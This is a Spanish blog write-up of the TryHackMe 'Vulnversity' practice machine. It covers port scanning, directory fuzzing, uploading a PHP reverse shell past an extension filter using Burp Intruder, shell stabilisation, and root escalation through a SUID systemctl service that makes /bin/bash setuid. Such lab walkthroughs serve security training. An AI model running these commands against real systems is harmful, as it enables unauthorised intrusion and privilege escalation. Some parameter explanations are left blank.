I"ﬂS<p>El d√≠a de hoy vamos a resolver la m√°quina <em>Vulnversity</em> de <em>TryHackMe</em>. Esta es una m√°quina f√°cil tanto en la intrusi√≥n como en la escalada de privilegios, por lo que no supondr√° ninguna complicaci√≥n a la hora de realizarla.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos est√°n abiertos as√≠ como identificar la versi√≥n y servicios que corren en el activo. Es importante aclarar que as√≠ como menciona la plataforma de <em>TryHackMe</em>, existen diversos <a href="https://www.stationx.net/nmap-cheat-sheet/">cheatsheets</a> que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posiblidades que nos ofrece la herramienta.</p>

<p>No obstante, recordemos que varias herramientas por defecto tienen incluidas un <code class="language-plaintext highlighter-rouge">manual</code> o vienen con un comando <code class="language-plaintext highlighter-rouge">--help</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man nmap
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --help
</code></pre></div></div>

<p>Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:</p>

<ul>
  <li>¬øCu√°ntos puertos abiertos existen?</li>
  <li>¬øQu√© sistema operativo tiene la m√°quina ante la que nos estamos enfrentando?</li>
  <li>¬øEn qu√© puerto est√° corriendo el servidor web?</li>
  <li>¬øQu√© versi√≥n de squid proxy est√° corriendo en la m√°quina?</li>
</ul>

<p>Todas estas preguntas son f√°ciles de responder si realizamos un buen escaneo con <em>Nmap</em>.</p>

<p>Para determinar que puertos est√°n abiertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -T5 -v -n &lt;direcci√≥n IP&gt; -oG allPorts
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;direcci√≥n IP&gt; -oG allPorts
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que est√°n abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, ‚Äúgeneraremos m√°s ruido  ‚Äú, pero no pasa nada ¬øno? Al fin y al cabo estamos practicando en un entorno controlado y aqu√≠ somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resoluci√≥n DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no m√°s lentos que <em>valor</em> por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor informaci√≥n por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
  <li>oG - Exportar el escaneo en formato ‚Äú<em>grepeable</em>‚Äù</li>
</ul>

<p>Para determinar la versi√≥n y servicios que corren bajo estos puertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p 21,22,139,445,3128,3333 &lt;direcci√≥n IP&gt; -oN targeted
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts b√°sicos de enumeraci√≥n</li>
  <li>sV - Versi√≥n y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
  <li>oN - Exportar el escaneo en formato <em>Nmap</em></li>
</ul>

<p>Con estos dos escaneos bastar√° para responder a las preguntas planteadas con anterioridad, sin embargo nos quedan dos preguntas m√°s, las cuales son:</p>

<ul>
  <li>¬øCu√°ntos puertos se escanear√°n si utilizamos el par√°metro -p-400?</li>
  <li>Utilizando el par√°metro -n, ¬øqu√© no se est√° resolviendo?</li>
</ul>

<p>Para responder a estas dos preguntas bastar√° con haber le√≠do el <code class="language-plaintext highlighter-rouge">manual</code> de <em>Nmap</em>, haber utilizado su par√°metro <code class="language-plaintext highlighter-rouge">--help</code>, o bien, haber prestado atenci√≥n a los par√°metros utilizados durante el escaneo. En este caso, si colocamos un n√∫mero despu√©s de <code class="language-plaintext highlighter-rouge">-p-</code>, se escanear√° tantos puertos hayamos indicado; y en el caso del par√°metro <code class="language-plaintext highlighter-rouge">-n</code>, no se aplicar√° resoluci√≥n DNS.</p>

<p>Una vez hemos determinado que puertos est√°n abiertos, as√≠ como identificado la versi√≥n y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el <code class="language-plaintext highlighter-rouge">fuzzing</code>; cabe aclarar que este solo se realiza cuando la m√°quina v√≠ctima est√° corriendo un servidor web.</p>

<p><em>TryHackMe</em> nos recomienda utilizar <code class="language-plaintext highlighter-rouge">GoBuster</code>, sin embargo, personalmente prefiero el uso de <code class="language-plaintext highlighter-rouge">Wfuzz</code>; en caso de no contar con esta herramienta instalada, bastar√° con realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install wfuzz
</code></pre></div></div>

<p>Para pasar a la fase de explotaci√≥n, lo que nos solicita la plataforma es encontrar una ruta potencial de la p√°gina web, que nos permita una subida de archivos, para lo cual debemos de <em>fuzzear</em> la p√°gina web, para ello realizaremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 33014 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://direcci√≥n IP:3333/FUZZ 2&gt; /dev/null
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el <em>fuzzeo</em> del servidor web:</p>

<ul>
  <li>c -</li>
  <li>L -</li>
  <li>t -</li>
  <li>hc -</li>
  <li>hh -</li>
  <li>w -</li>
</ul>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/2.png" alt="" /></p>

<p>Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atenci√≥n, la direcci√≥n <code class="language-plaintext highlighter-rouge">internal</code>, ya que en <em>images</em>, <em>css</em>, <em>js</em> y <em>fonts</em> parece ser donde est√° alojado el contenido de la p√°gina web. Y en efecto, al entrar en la direcci√≥n <code class="language-plaintext highlighter-rouge">internal</code>, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/3.png" alt="" /></p>

<h3 id="fase-de-explotaci√≥n"><a href="#header-3"></a>Fase De Explotaci√≥n</h3>

<p>Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>; podemos descargar una <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">aqu√≠</a>. Una vez la hayamos descargado, tenemos que modificar el valor de la <code class="language-plaintext highlighter-rouge">ip</code> (colocamos la nuestra), y si queremos, podemos tambi√©n modificar el valor del <em>puerto</em>, aunque esto es completamente opcional.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/4.png" alt="" /></p>

<p>Sin embargo, cuando intentamos subir nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>, nos aparecer√° un mensaje indic√°ndonos que la extensi√≥n de nuestro archivo no es permitida.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/5.png" alt="" /></p>

<p>Por lo que tendremos que buscar una extensi√≥n que no nos de problema alguno. Si realizaramos este proceso de forma manual, ser√≠a algo bastante tedioso, por lo que vamos a utilizar <code class="language-plaintext highlighter-rouge">Burp Suite</code> para poder realizar una ataque de tipo <code class="language-plaintext highlighter-rouge">Sniper</code>.</p>

<p>Para ello, vamos a empezar por volver a subir nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>, pero ahora tramitando todas las peticiones a trav√©s de <code class="language-plaintext highlighter-rouge">Burp Suite</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/6.png" alt="" /></p>

<p>Posterior a ello presionaremos <code class="language-plaintext highlighter-rouge">Ctrl + I</code> para enviar esta petici√≥n al <code class="language-plaintext highlighter-rouge">Intruder</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/7.png" alt="" /></p>

<p>Ahora, en el apartado <em>Positions</em>, en el tipo de ataque elegiremos la opci√≥n de <code class="language-plaintext highlighter-rouge">Sniper</code>, despu√©s seleccionaremos la opci√≥n <code class="language-plaintext highlighter-rouge">Clear ¬ß</code>, para posteriormente con nuestro cursor <code class="language-plaintext highlighter-rouge">resaltar</code> la zona en la que se encuentra la extensi√≥n del archivo que subimos, para finalmente presionar la opci√≥n <code class="language-plaintext highlighter-rouge">Add ¬ß</code>; esto se ver√≠a algo as√≠:</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/8.png" alt="" /></p>

<p>Posteriormente, procederemos a crear un peque√±o diccionario con las extensiones m√°s comunes de <em>PHP</em>:</p>

<ul>
  <li>.php</li>
  <li>.phtml</li>
  <li>.php3</li>
  <li>.php4</li>
  <li>.php5</li>
  <li>.php7</li>
  <li>.phps</li>
  <li>.php-s</li>
  <li>.pht</li>
  <li>.phar</li>
</ul>

<p>Una vez, hemos creado nuestro diccionario, en el apartado <em>Payloads</em>, en la opci√≥n <em>Sample List</em> cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opci√≥n que codifica ciertos caracteres especiales, esta opci√≥n la desactivaremos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/9.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/10.png" alt="" /></p>

<p>Finalmente, presionaremos el bot√≥n de iniciar ataque, e inmediatamente aparecer√° una nueva ventana mostr√°ndonos los resultados obtenidos, o bien, aquello que todav√≠a est√° probando. Podr√≠amos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo c√≥digo de estado <code class="language-plaintext highlighter-rouge">200</code>, la <em>longitud</em> de estas no es la misma para para todas las extensiones, la √∫nica extensi√≥n cuya <em>longitud</em> var√≠a es <code class="language-plaintext highlighter-rouge">.phtml</code>; si quisieramos estar completamente seguros, podr√≠amos revisar el <code class="language-plaintext highlighter-rouge">render</code> de la respuesta, el cual nos devuelve un <code class="language-plaintext highlighter-rouge">success</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/11.png" alt="" /></p>

<p>Con esta informaci√≥n, ya sabemos que tipo de archivo es v√°lido para subir en la ruta <code class="language-plaintext highlighter-rouge">internal</code>, por lo que procederemos a cambiar la extensi√≥n de nuestro archivo y subirlo una √∫ltima vez.</p>

<p>Una vez el archivo est√° subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code> a trav√©s de <code class="language-plaintext highlighter-rouge">Netcat</code>. A partir de aqu√≠ podemos hacer dos cosas:</p>

<p>Podemos navegar a la direcci√≥n en la que est√° subido nuestro archivo (tal como lo indica la plataforma de <em>TryHackMe</em>), es decir, entrar a:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;direcci√≥n IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
</code></pre></div></div>
<p>O por otra parte, y sin dejar la consola, utilizar el comando <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;direcci√≥n IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
</code></pre></div></div>

<p>Ambas opciones, nos conseguir√°n una <em>consola</em> dentro de la m√°quina v√≠ctima.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/12.png" alt="" /></p>

<p>Es importante aclarar que la <em>consola</em> que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisieramos limpiar la <em>consola</em> utilizando <code class="language-plaintext highlighter-rouge">Ctrl + L</code>, no pasar√° nada, as√≠ mismo si quisieramos desplazarnos utilizando las <code class="language-plaintext highlighter-rouge">flechas</code> del teclado, no nos ser√° posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la <code class="language-plaintext highlighter-rouge">TTY</code>, para lo cual haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null -c bash

Ctrl + Z

stty raw -echo; fg
reset
xterm

export TERM=xterm
export SHELL=bash

stty rows &lt;valor&gt; columns &lt;valor&gt;
</code></pre></div></div>

<p>Los valores que colocaremos en <code class="language-plaintext highlighter-rouge">&lt;valor&gt;</code> en el √∫ltimo comando, depender√°n del tama√±o de nuestra pantalla, por lo cual en una nueva terminal de nuestra m√°quina escribiremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty -a
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/13.png" alt="" /></p>

<p>Continuando con las preguntas de la plataforma, se nos pide averigurar por el usuario que maneja el servidor web, as√≠ como su respectiva <code class="language-plaintext highlighter-rouge">flag</code>. Para realizar esto podr√≠amos dirigirnos al directorio <code class="language-plaintext highlighter-rouge">/home</code>, y listar los directorios que existen.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/14.png" alt="" /></p>

<p>Aunque tambi√©n podriamos filtrar del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, a trav√©s de expresiones regulares, todos aquellos usuario que tengan una <em>shell</em>, sea esta una:</p>

<ul>
  <li>bash</li>
  <li>csh</li>
  <li>ksh</li>
  <li>sh</li>
  <li>tcsh</li>
  <li>zsh</li>
</ul>

<p>Esto ser√≠a bastante f√°cil, ya que todas, o casi todas las <em>shells</em> terminan en <code class="language-plaintext highlighter-rouge">sh</code>, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/15.png" alt="" /></p>

<p>Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la <code class="language-plaintext highlighter-rouge">flag</code> del usuario con bajos privilegios, para ello podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -name user.txt 2&gt; /dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/16.png" alt="" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>Para realizar esta √∫ltima fase, la misma plataforma de <em>TryHackMe</em> nos sugiere aprovecharnos de alg√∫n binario con permisos mal asignados, concretamente permisos <code class="language-plaintext highlighter-rouge">SUID</code>.</p>

<p>Para listar todos aquellos binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/17.png" alt="" /></p>

<p>La mejor forma para abusar de alg√∫n binario, es recurrir a <a href="https://gtfobins.github.io/">GTFOBins</a>, esta p√°gina nos ense√±a como explotar binarios con <em>capabilities</em> mal asignadas, binarios que se pueden ejectuar como <em>root</em>, y en este caso, binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> mal asignados.</p>

<p>En este caso, el binario m√°s extra√±o que nos encontramos es <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscar en <code class="language-plaintext highlighter-rouge">GTFOBins</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/18.png" alt="" /></p>

<p>Como podemos ver, podemos abusar de este binario f√°cilmente, adem√°s de que nos permite ejecutar cualquier c√≥digo malicioso que queramos, para conseguir la √∫ltima <code class="language-plaintext highlighter-rouge">flag</code> haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' &gt; $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
</code></pre></div></div>

<p>Lo √∫nico que modificamos de la informaci√≥n que nos provee <code class="language-plaintext highlighter-rouge">GTFOBins</code>, fue el c√≥digo a ejecutar, en este caso, asignar un permiso <code class="language-plaintext highlighter-rouge">SUID</code> a la <code class="language-plaintext highlighter-rouge">/bin/bash</code>, para a trav√©s del par√°metro <code class="language-plaintext highlighter-rouge">-p</code>, ejecutar el binario <code class="language-plaintext highlighter-rouge">/bin/bash</code> manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario <em>root</em>. Otro aspecto que se modific√≥ fue utilizar el binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code> desde su ruta absoluta, mas no de su ruta relativa.</p>

<p>Una vez siendo <em>root</em>, podemos pasar a buscar su respectiva flag, esto lo podemos hacer as√≠:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -name root.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/19.png" alt="" /></p>
:ET